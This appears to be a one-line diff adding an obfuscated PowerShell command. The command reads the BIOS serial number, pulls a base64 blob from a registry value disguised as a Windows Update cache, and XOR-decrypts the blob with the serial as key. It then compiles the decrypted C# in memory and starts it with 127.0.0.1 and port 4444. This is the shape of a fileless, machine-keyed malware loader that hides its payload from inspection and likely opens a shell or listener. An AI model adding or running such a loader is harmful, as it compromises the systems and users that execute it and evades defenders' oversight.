@@ -1,0 +1,1 @@
+$k=(gwmi Win32_BIOS).SerialNumber.Trim();$e=(gp HKCU:\Software\WindowsUpdate).DataCache;$b=[Convert]::FromBase64String($e);$p=[Text.Encoding]::UTF8.GetBytes($k);for($i=0;$i-lt$b.Length;$i++){$b[$i]=$b[$i]-bxor$p[$i%$p.Length]};Add-Type -TypeDefinition ([Text.Encoding]::UTF8.GetString($b)) -Language CSharp;[C_ahpOiS]::Start("127.0.0.1", 4444)
